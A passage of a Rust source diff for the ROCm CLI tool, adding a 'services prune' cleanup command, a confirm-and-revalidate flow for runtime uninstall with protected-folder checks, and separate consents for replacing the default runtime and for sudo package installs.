+/// Modification times of every `*.json` in the services directory, taken before
+/// anything in this run can rewrite them.
+///
+/// [`load_managed_services`] refreshes each record against the engine state and
+/// the real processes, and persists the result whenever that changes the status
+/// — which is exactly what happens the first time anything observes that a
+/// `ready`/`running`/`starting` server has died. That rewrite lands *after* the
+/// `now` the age gate compares against, so a manifest read afterwards looks
+/// newer than the run itself and the fail-closed branch keeps it forever. A host
+/// whose servers died weeks ago but were never listed since would see
+/// `rocm services prune --yes` remove nothing while reporting those records as
+/// too recent to touch.
+fn service_manifest_modified_times(paths: &AppPaths) -> HashMap<PathBuf, SystemTime> {
+    let mut times = HashMap::new();
+    let Ok(entries) = fs::read_dir(paths.services_dir()) else {
+        return times;
+    };
+    for path in entries.flatten().map(|entry| entry.path()) {
+        if path.extension().and_then(|value| value.to_str()) != Some("json") {
+            continue;
+        }
+        if let Some(modified) = path_modified(&path) {
+            times.insert(path, modified);
+        }
+    }
+    times
+}
+
+/// The age threshold one `prune` invocation runs with, in hours.
+///
+/// `--any-age` is the discoverable spelling of `--older-than-hours 0` — clap
+/// rejects the two together — so this only has to collapse the flag. It is a
+/// function rather than a line inside the dispatch `match` so a test can drive
+/// the real parsed arguments through the same mapping the command uses.
+const fn service_prune_min_age_hours(older_than_hours: u64, any_age: bool) -> u64 {
+    if any_age { 0 } else { older_than_hours }
+}
+
+fn describe_hours(hours: u64) -> String {
+    if hours == 1 {
+        "1 hour".to_owned()
+    } else {
+        format!("{hours} hours")
+    }
+}
+
+/// Files in `services_dir` and the engine state dirs that no longer belong to
+/// any record.
+///
+/// A `<id>.log` or `<id>.endpoint-key` counts as orphaned only when `<id>.json`
+/// is *absent from disk* — not merely absent from `records`. An unparseable
+/// manifest is skipped by `load_managed_services`, and treating its siblings as
+/// orphans would quietly delete the log of the one record a user most needs to
+/// investigate. The corrupt manifest itself is never removed for the same
+/// reason.
+///
+/// `services_dir` also holds `launch.lock`, which is shared by every managed
+/// launch rather than owned by one service (see
+/// [`AppPaths::managed_launch_lock_path`]). Only the three per-service
+/// extensions are considered, so the lock is never a candidate.
+fn collect_service_orphans(paths: &AppPaths, min_age: Duration, now: SystemTime) -> Vec<PathBuf> {
+    let services_dir = paths.services_dir();
+    let mut orphans = Vec::new();
+
+    let push_if_orphaned = |path: &Path, orphans: &mut Vec<PathBuf>| {
+        let Some(stem) = path.file_stem().and_then(|stem| stem.to_str()) else {
+            return;
+        };
+        if services_dir.join(format!("{stem}.json")).exists() {
+            return;
+        }
+        if prunable_by_age(path, min_age, now) {
+            orphans.push(path.to_path_buf());
+        }
+    };
+
+    if let Ok(entries) = fs::read_dir(&services_dir) {
+        for path in entries.flatten().map(|entry| entry.path()) {
+            if matches!(
+                path.extension().and_then(|value| value.to_str()),
+                Some("log" | "endpoint-key")
+            ) {
+                push_if_orphaned(&path, &mut orphans);
+            }
+        }
+    }
+
+    // `<data>/engines/<engine>/state/<id>.json`. `engines/plugins` has no
+    // `state` subdirectory, so it never yields candidates.
+    if let Ok(engines) = fs::read_dir(paths.data_dir.join("engines")) {
+        for engine_dir in engines.flatten().map(|entry| entry.path()) {
+            let Some(engine) = engine_dir.file_name().and_then(|name| name.to_str()) else {
+                continue;
+            };
+            let Ok(states) = fs::read_dir(paths.engine_state_dir(engine)) else {
+                continue;
+            };
+            for path in states.flatten().map(|entry| entry.path()) {
+                if path.extension().and_then(|value| value.to_str()) == Some("json") {
+                    push_if_orphaned(&path, &mut orphans);
+                }
+            }
+        }
+    }
+
+    orphans.sort();
+    orphans
+}
+
+fn build_service_prune_plan(
+    paths: &AppPaths,
+    min_age: Duration,
+    hours: u64,
+    now: SystemTime,
+) -> Result<ServicePrunePlan> {
+    let mut plan = ServicePrunePlan::default();
+    // Taken first, because `load_managed_services` below rewrites the manifest of
+    // every record whose status its refresh corrects — see
+    // `service_manifest_modified_times` for why reading the time afterwards makes
+    // the age gate keep exactly the long-dead records prune exists to remove.
+    let manifest_times = service_manifest_modified_times(paths);
+    // `load_managed_services` refreshes each record against the engine state and
+    // the real processes before returning it, so liveness below is read from the
+    // refreshed view, never from the manifest as it was on disk.
+    for record in load_managed_services(paths)? {
+        if managed_service_record_is_in_use(&record) {
+            plan.skipped_live += 1;
+            plan.skipped.push(format!(
+                "{} is {} — stop it first with `rocm services stop {} --yes`",
+                record.service_id, record.status, record.service_id
+            ));
+            continue;
+        }
+        let artifacts = match service_record_artifacts(paths, &record.service_id, &record.engine) {
+            Ok(artifacts) => artifacts,
+            Err(error) => {
+                plan.skipped.push(format!("{}: {error}", record.service_id));
+                continue;
+            }
+        };
+        if !prunable_by_modified(
+            manifest_times.get(&artifacts.manifest).copied(),
+            min_age,
+            now,
+        ) {
+            plan.skipped_recent += 1;
+            plan.skipped.push(format!(
+                "{} changed less than {} ago",
+                record.service_id,
+                describe_hours(hours)
+            ));
+            continue;
+        }
+        plan.remove.push(ServicePruneEntry {
+            service_id: record.service_id.clone(),
+            engine: record.engine.clone(),
+            status: record.status.clone(),
+            artifacts,
+        });
+    }
+    plan.orphans = collect_service_orphans(paths, min_age, now);
+    plan.remove
+        .sort_by(|left, right| left.service_id.cmp(&right.service_id));
+    plan.skipped.sort();
+    Ok(plan)
+}
+
+fn render_service_prune_plan(plan: &ServicePrunePlan, hours: u64, dry_run: bool) -> String {
+    let mut output = String::new();
+    let _ = writeln!(output, "Local server record review");
+    let _ = writeln!(output);
+    if hours == 0 {
+        let _ = writeln!(
+            output,
+            "Including every record that is not running, however recent."
+        );
+    } else {
+        let _ = writeln!(
+            output,
+            "Only records and files untouched for at least {}.",
+            describe_hours(hours)
+        );
+    }
+    let _ = writeln!(output);
+
+    if plan.remove.is_empty() && plan.orphans.is_empty() {
+        let _ = writeln!(output, "Nothing would be removed.");
+    }
+    if plan.skipped_recent > 0 {
+        let _ = writeln!(
+            output,
+            "{} record(s) changed less than {} ago and are kept; add --any-age to include them.",
+            plan.skipped_recent,
+            describe_hours(hours)
+        );
+    }
+    if !plan.remove.is_empty() {
+        let _ = writeln!(
+            output,
+            "{} local server record(s) would be removed:",
+            plan.remove.len()
+        );
+        for entry in &plan.remove {
+            let _ = writeln!(
+                output,
+                "  - {} (status: {}, engine: {})",
+                entry.service_id, entry.status, entry.engine
+            );
+            for path in entry.artifacts.paths() {
+                if path.exists() {
+                    let _ = writeln!(output, "      {}", path.display());
+                }
+            }
+        }
+        let _ = writeln!(output);
+        let _ = writeln!(
+            output,
+            "Their logs go with them, and `rocm services restart <service-id> --yes` stops working for them."
+        );
+    }
+    if !plan.orphans.is_empty() {
+        if !plan.remove.is_empty() {
+            let _ = writeln!(output);
+        }
+        let _ = writeln!(
+            output,
+            "{} leftover file(s) with no local server record would be removed:",
+            plan.orphans.len()
+        );
+        for path in &plan.orphans {
+            let _ = writeln!(output, "  - {}", path.display());
+        }
+    }
+    if !plan.skipped.is_empty() {
+        let _ = writeln!(output);
+        let _ = writeln!(output, "Left alone:");
+        for skipped in &plan.skipped {
+            let _ = writeln!(output, "  - {skipped}");
+        }
+    }
+    if dry_run {
+        let _ = writeln!(output);
+        // "Nothing was removed", not "nothing was changed": building the plan
+        // loads every record, and loading corrects a status that no longer
+        // matches the real processes and persists that correction. No file is
+        // deleted, which is the promise a dry run of a removal command makes.
+        let _ = writeln!(
+            output,
+            "Nothing was removed. Re-run without --dry-run to remove."
+        );
+    }
+    output
+}
+
+#[derive(Debug, Default)]
+struct ServicePruneOutcome {
+    text: String,
+    removed_records: usize,
+    removed_files: usize,
+    /// Records left in place purely because they are still running.
+    skipped_live: usize,
+    skipped_recent: usize,
+    /// Paths the run could not delete, one message each. Collected rather than
+    /// propagated so the plan still prints and the audit event is still
+    /// recorded; the caller turns a non-empty list into a failing exit.
+    failures: Vec<String>,
+}
+
+/// Carry out everything `plan` names, recording what happened in `outcome`.
+///
+/// Split out of [`prune_managed_service_records`] rather than inlined there so a
+/// test can hand it a plan entry whose record came back to life after the plan
+/// was built. That window is the only reason the liveness re-check below exists,
+/// and no test driving `prune` end to end can open it: one call builds the plan
+/// and applies it, so a record is either live for both halves or dead for both.
+fn apply_service_prune_plan(
+    paths: &AppPaths,
+    plan: &ServicePrunePlan,
+    outcome: &mut ServicePruneOutcome,
+) {
+    for entry in &plan.remove {
+        // Liveness was snapshotted while the plan was built. A
+        // `rocm services restart <id> --yes` landing in that window would have
+        // its log and 0600 endpoint key deleted out from under a live process,
+        // so re-read the record immediately before touching its files —
+        // `remove` narrows the same window by loading the record it deletes.
+        // Neither closes it: the check and the delete are not atomic either way.
+        if load_managed_service(paths, &entry.service_id)
+            .is_ok_and(|record| managed_service_record_is_in_use(&record))
+        {
+            outcome.skipped_live += 1;
+            let _ = writeln!(
+                outcome.text,
+                "  {} started again while this ran and was left alone.",
+                entry.service_id
+            );
+            continue;
+        }
+        let (removed, failures) = try_remove_service_record_artifacts(&entry.artifacts);
+        outcome.removed_files += removed.len();
+        if failures.is_empty() {
+            outcome.removed_records += 1;
+        }
+        outcome.failures.extend(failures);
+    }
+    for path in &plan.orphans {
+        match fs::remove_file(path) {
+            Ok(()) => outcome.removed_files += 1,
+            Err(error) if error.kind() == std::io::ErrorKind::NotFound => {}
+            Err(error) => outcome
+                .failures
+                .push(format!("{}: {error}", path.display())),
+        }
+    }
+}
+
+/// Bulk-remove the local server records that are no longer running.
+///
+/// Unlike [`remove_managed_service_record`] a live record is *skipped*, not an
+/// error: a bulk cleanup that aborted because one server happened to be serving
+/// would be unusable on the hosts that need it most. The count is reported so
+/// the skip is never silent.
+fn prune_managed_service_records(
+    paths: &AppPaths,
+    hours: u64,
+    dry_run: bool,
+    yes: bool,
+) -> Result<ServicePruneOutcome> {
+    if !dry_run && !yes {
+        bail!(
+            "Removing local server records requires --yes.\n\nTry: rocm services prune --dry-run\nThen: rocm services prune --yes"
+        );
+    }
+    let min_age = Duration::from_secs(hours.saturating_mul(3600));
+    let plan = build_service_prune_plan(paths, min_age, hours, SystemTime::now())?;
+    let mut outcome = ServicePruneOutcome {
+        text: render_service_prune_plan(&plan, hours, dry_run),
+        skipped_live: plan.skipped_live,
+        skipped_recent: plan.skipped_recent,
+        ..ServicePruneOutcome::default()
+    };
+    if dry_run {
+        return Ok(outcome);
+    }
+
+    apply_service_prune_plan(paths, &plan, &mut outcome);
+
+    let _ = writeln!(outcome.text);
+    let _ = write!(
+        outcome.text,
+        "{}",
+        cli_report::ActionReport::new("Local server records removed")
+            .detail("records removed", outcome.removed_records)
+            .detail("files removed", outcome.removed_files)
+            .detail("still running, left alone", outcome.skipped_live)
+            .detail("too recent, kept", outcome.skipped_recent)
+            .render()
+    );
+    // A bulk cleanup that silently keeps things is indistinguishable from one
+    // that found nothing, and the records most worth reading are exactly the
+    // ones this keeps.
+    if outcome.skipped_recent > 0 {
+        let _ = writeln!(
+            outcome.text,
+            "  Those are recent enough to still be worth reading: `rocm services logs <id>`.\n  \
+             Run `rocm services prune --any-age --yes` to remove them too."
+        );
+    }
+    if !outcome.failures.is_empty() {
+        let _ = writeln!(outcome.text);
+        let _ = writeln!(
+            outcome.text,
+            "{} file(s) could not be removed:",
+            outcome.failures.len()
+        );
+        for failure in &outcome.failures {
+            let _ = writeln!(outcome.text, "  - {failure}");
+        }
+        let _ = writeln!(
+            outcome.text,
+            "Re-running is safe: everything already removed stays removed."
+        );
+    }
+    Ok(outcome)
+}
+
 fn runtimes(command: Option<RuntimesCommand>) -> Result<()> {
     let paths = AppPaths::discover()?;
     let mut config = RocmCliConfig::load(&paths)?;
@@ -6085,6 +8273,9 @@ fn runtimes(command: Option<RuntimesCommand>) -> Result<()> {
             println!(
                 "  note: running services keep their recorded runtime until they are restarted"
             );
+            if result.previous_runtime_key.is_some() {
+                println!("{ROLLBACK_RECOVERY_HINT}");
+            }
             println!("  marker: {}", active_runtime_marker_path(&paths).display());
             println!("  config: {}", paths.config_path().display());
             record_cli_audit_event(
@@ -6125,38 +8316,89 @@ fn runtimes(command: Option<RuntimesCommand>) -> Result<()> {
                 None,
             );
         }
-        RuntimesCommand::Uninstall { runtime } => {
-            let result = uninstall_runtime(&paths, &mut config, &runtime)?;
-            println!("runtime removed");
-            println!("  runtime_id: {}", result.runtime_id);
-            println!("  runtime_key: {}", result.runtime_key);
-            println!("  registry_removed: {}", result.registry_path.display());
-            match result.removed_install_root.as_ref() {
-                Some(path) => println!("  folder_removed: {}", path.display()),
-                None if result.read_only => {
-                    println!("  folder_removed: no");
-                    println!("  note: existing external runtime folder was left untouched");
+        RuntimesCommand::Uninstall {
+            runtime,
+            yes,
+            dry_run,
+        } => {
+            let plan = plan_runtime_uninstall(&paths, &config, &runtime)?;
+            print_runtime_uninstall_plan(&plan);
+
+            if dry_run {
+                println!("dry run: no changes made");
+                return Ok(());
+            }
+
+            let plan = if yes {
+                plan
+            } else {
+                if !interactive_terminal() {
+                    bail!("runtimes uninstall requires --yes outside an interactive terminal");
                 }
-                None => println!("  folder_removed: no"),
+                match confirm_and_revalidate_runtime_uninstall(&paths, plan, confirm_uninstall)? {
+                    RuntimeUninstallConfirmation::Cancelled => {
+                        println!("runtime uninstall cancelled");
+                        return Ok(());
+                    }
+                    RuntimeUninstallConfirmation::Confirmed {
+                        plan: revalidated,
+                        config: reloaded,
+                    } => {
+                        config = *reloaded;
+                        *revalidated
+                    }
+                }
+            };
+            let result = apply_runtime_uninstall(&paths, &mut config, plan)?;
+
+            let mut report = cli_report::ActionReport::new("runtime removed")
+                .detail("runtime_id", &result.runtime_id)
+                .detail("runtime_key", &result.runtime_key)
+                .detail("registry_removed", result.registry_path.display());
+            match result.removed_install_root.as_ref() {
+                Some(path) => {
+                    report = report.detail("folder_removed", path.display());
+                }
+                None if result.read_only => {
+                    report = report.detail("folder_removed", "no").detail(
+                        "note",
+                        "existing external runtime folder was left untouched",
+                    );
+                }
+                None if result.manifest_mismatch => {
+                    report = report.detail("folder_removed", "no").detail(
+                        "note",
+                        "local runtime manifest did not match the registry; the folder was \
+                         left in place to avoid deleting the wrong install",
+                    );
+                }
+                None => {
+                    report = report.detail("folder_removed", "no");
+                }
             }
-            if result.was_active {
-                println!("  default_runtime: cleared");
-                println!("  next step: rocm runtimes activate <runtime_key>");
+            if result.default_runtime_cleared {
+                report = report
+                    .detail("default_runtime", "cleared")
+                    .detail("next step", "rocm runtimes activate <runtime_key>");
             }
-            println!("  config: {}", paths.config_path().display());
+            report = report.detail("config", paths.config_path().display());
+            print!("{}", report.render());
             record_cli_audit_event(
                 &paths,
                 "runtime",
                 "runtime_uninstall",
                 "info",
                 format!(
-                    "removed runtime_key={} runtime_id={} removed_install_root={}",
+                    "removed runtime_key={} runtime_id={} removed_install_root={} \
+                     was_active={} default_runtime_cleared={}",
                     result.runtime_key,
                     result.runtime_id,
                     result
                         .removed_install_root
                         .as_ref()
-                        .map_or_else(|| "none".to_owned(), |path| path.display().to_string())
+                        .map_or_else(|| "none".to_owned(), |path| path.display().to_string()),
+                    result.was_active,
+                    result.default_runtime_cleared,
                 ),
                 None,
             );
@@ -6270,8 +8512,18 @@ struct RuntimeUninstallResult {
     registry_path: PathBuf,
     removed_install_root: Option<PathBuf>,
     read_only: bool,
+    manifest_mismatch: bool,
     was_active: bool,
+    default_runtime_cleared: bool,
 }
+
+/// Marker shown beside the active runtime in `rocm runtimes list`. Every
+/// place that renders this glyph MUST use this constant so the rendered
+/// character and the legend text stay in sync.
+const ACTIVE_RUNTIME_MARKER: &str = "*";
+/// Marker shown beside the rollback-target runtime. See
+/// [`ACTIVE_RUNTIME_MARKER`].
+const ROLLBACK_RUNTIME_MARKER: &str = "-";
 
 pub(crate) fn render_runtimes_text(paths: &AppPaths, config: &RocmCliConfig) -> Result<String> {
     recover_setup_runtime_registration(paths, config)?;
@@ -6352,6 +8604,11 @@ pub(crate) fn render_runtimes_text(paths: &AppPaths, config: &RocmCliConfig) -> 
     drop(default_runtime_matches);
 
     let _ = writeln!(output, "  installed:");
+    let _ = writeln!(
+        output,
+        "    legend: {ACTIVE_RUNTIME_MARKER} = active, {ROLLBACK_RUNTIME_MARKER} = rollback target"
+    );
+    let _ = writeln!(output);
     for manifest in manifests {
         let active = config
             .active_runtime_key
@@ -6363,9 +8620,9 @@ pub(crate) fn render_runtimes_text(paths: &AppPaths, config: &RocmCliConfig) -> 
             .as_deref()
             .is_some_and(|runtime_key| runtime_key == manifest.runtime_key);
         let marker = if active {
-            "*"
+            ACTIVE_RUNTIME_MARKER
         } else if rollback {
-            "-"
+            ROLLBACK_RUNTIME_MARKER
         } else {
             " "
         };
@@ -6483,23 +8740,191 @@ fn rollback_runtime(
     })
 }
 
-fn uninstall_runtime(
+/// A runtime's install folder is only ever removed when ROCm CLI is confident
+/// it owns that folder; `ReadOnly` and `ManifestMismatch` are distinct reasons
+/// for leaving it alone, surfaced separately so a real problem (a stale or
+/// corrupt local manifest) doesn't look identical to an intentional no-op.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum InstallRootDecision {
+    Remove,
+    ReadOnly,
+    ManifestMismatch,
+}
+
+impl InstallRootDecision {
+    const fn should_remove(self) -> bool {
+        matches!(self, Self::Remove)
+    }
+}
+
+#[derive(Debug, Clone)]
+struct RuntimeUninstallPlan {
+    manifest: therock::InstalledRuntimeManifest,
+    registry_path: PathBuf,
+    was_active: bool,
+    /// Whether applying this plan will clear `config.default_runtime_id`.
+    /// This is true when the config's default still points at this
+    /// manifest's `runtime_id` and either this manifest was the active one,
+    /// or it is the last remaining install sharing that `runtime_id` (the
+    /// id is shared across side-by-side installs, so removing one sibling
+    /// does not by itself orphan the default while others remain).
+    clears_default_runtime: bool,
+    install_root_decision: InstallRootDecision,
+}
+
+impl RuntimeUninstallPlan {
+    fn will_remove_install_root(&self) -> bool {
+        self.install_root_decision.should_remove() && self.manifest.install_root.exists()
+    }
+}
+
+fn print_runtime_uninstall_plan(plan: &RuntimeUninstallPlan) {
+    let install_folder = if plan.will_remove_install_root() {
+        format!(
+            "{} (would be removed)",
+            plan.manifest.install_root.display()
+        )
+    } else {
+        match plan.install_root_decision {
+            InstallRootDecision::Remove => "not present, nothing to remove".to_owned(),
+            InstallRootDecision::ReadOnly => {
+                "left untouched (external/read-only runtime)".to_owned()
+            }
+            InstallRootDecision::ManifestMismatch => {
+                "left untouched (local runtime manifest did not match the registry)".to_owned()
+            }
+        }
+    };
+
+    let mut report = cli_report::ActionReport::new("runtime uninstall plan")
+        .detail("runtime_id", &plan.manifest.runtime_id)
+        .detail("runtime_key", &plan.manifest.runtime_key)
+        .detail("registry_entry", plan.registry_path.display())
+        .detail("install_folder", install_folder);
+    if plan.clears_default_runtime {
+        report = report.detail("default_runtime", "would be cleared");
+    }
+    print!("{}", report.render());
+}
+
+fn plan_runtime_uninstall(
     paths: &AppPaths,
-    config: &mut RocmCliConfig,
+    config: &RocmCliConfig,
     selector: &str,
-) -> Result<RuntimeUninstallResult> {
+) -> Result<RuntimeUninstallPlan> {
     let manifests = therock::load_runtime_manifests(paths)?;
     let manifest = select_runtime_manifest(&manifests, selector)?.clone();
     let registry_path = runtime_manifest_path(paths, &manifest.runtime_key);
     let was_active = current_runtime_manifest(config, &manifests)
         .is_some_and(|current| current.runtime_key == manifest.runtime_key);
-    let remove_install_root = should_remove_runtime_install_root(&manifest)?;
+    let clears_default_runtime = config
+        .default_runtime_id
+        .as_deref()
+        .is_some_and(|runtime_id| runtime_id.eq_ignore_ascii_case(&manifest.runtime_id))
+        && (was_active
+            || !manifests.iter().any(|other| {
+                other.runtime_key != manifest.runtime_key
+                    && other.runtime_id.eq_ignore_ascii_case(&manifest.runtime_id)
+            }));
+    let install_root_decision = should_remove_runtime_install_root(&manifest)?;
+    Ok(RuntimeUninstallPlan {
+        manifest,
+        registry_path,
+        was_active,
+        clears_default_runtime,
+        install_root_decision,
+    })
+}
+
+/// Re-derives the uninstall plan from disk and refuses to proceed if it no
+/// longer matches what the user approved. The interactive confirmation this
+/// guards can wait indefinitely; if another process activates a different
+/// runtime or replaces the install folder while the prompt is open, applying
+/// the stale plan could clear the wrong `active_runtime_key` or recursively
+/// delete a folder that is no longer the one that was vetted as safe to
+/// remove.
+fn revalidate_runtime_uninstall_plan(
+    paths: &AppPaths,
+    config: &RocmCliConfig,
+    plan: RuntimeUninstallPlan,
+) -> Result<RuntimeUninstallPlan> {
+    let fresh = plan_runtime_uninstall(paths, config, &plan.manifest.runtime_key)?;
+    if fresh.manifest.runtime_id != plan.manifest.runtime_id
+        || fresh.manifest.install_root != plan.manifest.install_root
+        || fresh.was_active != plan.was_active
+        || fresh.clears_default_runtime != plan.clears_default_runtime
+        || fresh.install_root_decision != plan.install_root_decision
+    {
+        bail!(
+            "runtime state for {} changed while waiting for confirmation; re-run `rocm runtimes uninstall {}` to review the current plan before approving it",
+            plan.manifest.runtime_key,
+            plan.manifest.runtime_key
+        );
+    }
+    Ok(fresh)
+}
+
+enum RuntimeUninstallConfirmation {
+    Cancelled,
+    // `RuntimeUninstallPlan`/`RocmCliConfig` are large; box them so the two
+    // variants stay a similar size (clippy::large_enum_variant).
+    Confirmed {
+        plan: Box<RuntimeUninstallPlan>,
+        config: Box<RocmCliConfig>,
+    },
+}
+
+/// Runs the confirm-then-revalidate sequence used by an interactive
+/// `runtimes uninstall`: waits for the caller-supplied confirmation, then
+/// reloads config from disk and re-derives the plan against it, so a state
+/// change that happened while the (potentially indefinite) prompt was open
+/// cannot be applied against stale data.
+fn confirm_and_revalidate_runtime_uninstall(
+    paths: &AppPaths,
+    plan: RuntimeUninstallPlan,
+    confirm: impl FnOnce() -> Result<bool>,
+) -> Result<RuntimeUninstallConfirmation> {
+    if !confirm()? {
+        return Ok(RuntimeUninstallConfirmation::Cancelled);
+    }
+    let config = RocmCliConfig::load(paths)?;
+    let plan = revalidate_runtime_uninstall_plan(paths, &config, plan)?;
+    Ok(RuntimeUninstallConfirmation::Confirmed {
+        plan: Box::new(plan),
+        config: Box::new(config),
+    })
+}
+
+fn uninstall_runtime(
+    paths: &AppPaths,
+    config: &mut RocmCliConfig,
+    selector: &str,
+) -> Result<RuntimeUninstallResult> {
+    let plan = plan_runtime_uninstall(paths, config, selector)?;
+    apply_runtime_uninstall(paths, config, plan)
+}
+
+fn apply_runtime_uninstall(
+    paths: &AppPaths,
+    config: &mut RocmCliConfig,
+    plan: RuntimeUninstallPlan,
+) -> Result<RuntimeUninstallResult> {
+    let RuntimeUninstallPlan {
+        manifest,
+        registry_path,
+        was_active,
+        clears_default_runtime,
+        install_root_decision,
+    } = plan;
 
     let mut removed_install_root = None;
-    if remove_install_root && manifest.install_root.exists() {
+    if install_root_decision.should_remove() && manifest.install_root.exists() {
         fs::remove_dir_all(&manifest.install_root).with_context(|| {
             format!(
-                "failed to remove runtime folder {}",
+                "failed to remove runtime folder {} — the runtime registry entry has not \
+                 been removed yet, so `rocm runtimes list` will still show this runtime as \
+                 installed and pointing at this (now possibly partially deleted) folder \
+                 until the removal succeeds",
                 manifest.install_root.display()
             )
         })?;
@@ -6532,16 +8957,7 @@ fn uninstall_runtime(
         config.previous_runtime_key = None;
         config_changed = true;
     }
-    if config
-        .default_runtime_id
-        .as_deref()
-        .is_some_and(|runtime_id| runtime_id.eq_ignore_ascii_case(&manifest.runtime_id))
-        && (was_active
-            || !manifests.iter().any(|other| {
-                other.runtime_key != manifest.runtime_key
-                    && other.runtime_id.eq_ignore_ascii_case(&manifest.runtime_id)
-            }))
-    {
+    if clears_default_runtime {
         config.default_runtime_id = None;
         config_changed = true;
     }
@@ -6578,21 +8994,23 @@ fn uninstall_runtime(
         registry_path,
         removed_install_root,
         read_only: manifest.read_only,
+        manifest_mismatch: matches!(install_root_decision, InstallRootDecision::ManifestMismatch),
         was_active,
+        default_runtime_cleared: clears_default_runtime,
     })
 }
 
 fn should_remove_runtime_install_root(
     manifest: &therock::InstalledRuntimeManifest,
-) -> Result<bool> {
+) -> Result<InstallRootDecision> {
     if manifest.read_only || manifest.imported_from.is_some() {
-        return Ok(false);
+        return Ok(InstallRootDecision::ReadOnly);
     }
     if !local_runtime_manifest_matches(manifest)? {
-        return Ok(false);
+        return Ok(InstallRootDecision::ManifestMismatch);
     }
     ensure_runtime_install_root_is_safe_to_remove(&manifest.install_root)?;
-    Ok(true)
+    Ok(InstallRootDecision::Remove)
 }
 
 fn local_runtime_manifest_matches(manifest: &therock::InstalledRuntimeManifest) -> Result<bool> {
@@ -6613,6 +9031,19 @@ fn ensure_runtime_install_root_is_safe_to_remove(path: &Path) -> Result<()> {
     if path.as_os_str().is_empty() || path.parent().is_none() || path.file_name().is_none() {
         bail!(
             "refusing to remove unsafe runtime folder {}",
+            path.display()
+        );
+    }
+    // Belt and braces: a hand-edited or corrupted registry entry could point
+    // `install_root` at a protected system location while still carrying a
+    // matching in-tree `.rocm-cli-runtime.json`, slipping past
+    // `local_runtime_manifest_matches`. `prune` already refuses these before
+    // ever calling this function (see storage.rs); check it here too so the
+    // single source of truth for "may ROCm CLI delete this folder?" refuses
+    // it for every caller, including a direct `runtimes uninstall <key>`.
+    if runtime_install_root_is_protected(path) {
+        bail!(
+            "refusing to remove runtime folder {} in a protected system location",
             path.display()
         );
     }
@@ -6694,6 +9125,7 @@ struct SdkInstallFinalization {
     runtime_key: String,
     install_root: PathBuf,
     family: String,
+    previous_runtime_key: Option<String>,
 }
 
 fn print_sdk_install_success(finalized: &SdkInstallFinalization) {
@@ -6706,6 +9138,93 @@ fn preferred_engine_for_sdk_family(family: &str) -> Option<&'static str> {
         ..rocm_core::HostGpuSummary::default()
     };
     preferred_serve_engine_for_host_gpu_summary(&summary)
+}
+
+/// The two unrelated consents `rocm install sdk` can be given.
+///
+/// They are separate because they authorize different things and are answerable
+/// in different places. Replacing the active default runtime is a decision, and
+/// an argv can express it fully. Approving a system-package install means
+/// approving `sudo`, which — unless the host is root or has passwordless sudo —
+/// needs a human at a terminal to type a password.
+///
+/// `--yes` grants both, which is what a user typing it at a terminal means.
+/// ROCm CLI's own non-interactive surfaces need only the first: they spawn
+/// `rocm` with null stdin, so a sudo password prompt there can never be
+/// answered, and treating their approval as covering it would run sudo they
+/// cannot complete — and, for the vLLM/OpenMPI plan, abort the engine
+/// auto-install that used to warn and continue.
+#[derive(Clone, Copy, Debug, PartialEq, Eq)]
+struct SdkInstallConsents {
+    /// Approve replacing whatever runtime is currently the active default, and
+    /// which flag granted it. The source is carried rather than flattened to a
+    /// bool because the install log names it: crediting `--yes` on a surface
+    /// that only ever passed the narrow flag would tell the reader that consent
+    /// to run `sudo` had been given when it had not.
+    replace_active_default: therock::SdkInstallConsent,
+    /// Approve installing required system packages (OpenMPI, libatomic,
+    /// libnuma) through the system package manager, which means `sudo`.
+    system_packages: bool,
+}
+
+impl SdkInstallConsents {
+    const fn resolve(yes: bool, approve_replacing_active_default: bool) -> Self {
+        let replace_active_default = if yes {
+            therock::SdkInstallConsent::Preapproved(therock::SdkInstallApprovalSource::AssumeYes)
+        } else if approve_replacing_active_default {
+            therock::SdkInstallConsent::Preapproved(
+                therock::SdkInstallApprovalSource::ApproveReplacingActiveDefault,
+            )
+        } else {
+            therock::SdkInstallConsent::Ask
+        };
+        Self {
+            replace_active_default,
+            system_packages: yes,
+        }
+    }
+}
+
+/// What to do with a distro-aware system-package install plan, given the caller's
+/// approval and what this host lets us do without a password.
+#[derive(Clone, Copy, Debug, PartialEq, Eq)]
+enum SystemPackageInstallAction {
+    /// Print the commands (and the preflight checks) and continue without them.
+    /// Nothing privileged is run, so nothing can block on a password prompt.
+    PrintManualCommands,
+    /// Run the plan. `run_system_package_install_plan` inherits stdin so an
+    /// interactive `sudo` password prompt can be answered.
+    RunPlan {
+        /// The `approval:` line explaining why this was allowed to run.
+        approval: &'static str,
+        /// Whether a failed command is an error rather than a warning. Only an
+        /// explicit approval escalates: the automatic (root/passwordless) path
+        /// must never let a missing system package fail an unattended install.
+        escalate_failure: bool,
+    },
+}
+
+/// Decide between the two, given whether the *system-package* consent was granted
+/// and whether the host can install without prompting.
+///
+/// Split out from the two callers below so the decision is testable without a
+/// package manager, and so the "approved but no way to answer a password prompt"
+/// case has one place to be reasoned about.
+const fn system_package_install_action(
+    approved: bool,
+    can_autoinstall: bool,
+) -> SystemPackageInstallAction {
+    if !approved && !can_autoinstall {
+        return SystemPackageInstallAction::PrintManualCommands;
+    }
+    SystemPackageInstallAction::RunPlan {
+        approval: if approved {
+            "granted by --yes"
+        } else {
+            "auto (root or passwordless sudo available)"
+        },
+        escalate_failure: approved,
+    }
 }
 
 /// Ensure the OpenMPI runtime that vLLM requires is present before the vLLM wheel
@@ -6758,7 +9277,11 @@ fn ensure_openmpi_for_vllm(approved: bool) -> Result<()> {
     }
 
     let can_autoinstall = rocm_core::openmpi::can_autoinstall();
-    if !approved && !can_autoinstall {
+    let SystemPackageInstallAction::RunPlan {
+        approval,
+        escalate_failure,
+    } = system_package_install_action(approved, can_autoinstall)
+    else {
         for check in &plan.preflight_checks {
             println!("  preflight: {check}");
         }
@@ -6767,16 +9290,9 @@ fn ensure_openmpi_for_vllm(approved: bool) -> Result<()> {
             "warning: passwordless sudo is unavailable; run the commands above manually, or rerun with --yes to approve an interactive sudo prompt"
         );
         return Ok(());
-    }
+    };
 
-    println!(
-        "  approval: {}",
-        if approved {
-            "granted by --yes"
-        } else {
-            "auto (root or passwordless sudo available)"
-        }
-    );
+    println!("  approval: {approval}");
     match run_system_package_install_plan(&plan) {
         Ok(()) => {
             if rocm_core::openmpi::detect_openmpi().present {
@@ -6794,7 +9310,15 @@ fn ensure_openmpi_for_vllm(approved: bool) -> Result<()> {
             // past something the user asked for. The auto (unapproved) path keeps
             // the warn-and-continue behavior so a missing OpenMPI never blocks an
             // otherwise-unattended install.
-            if approved {
+            //
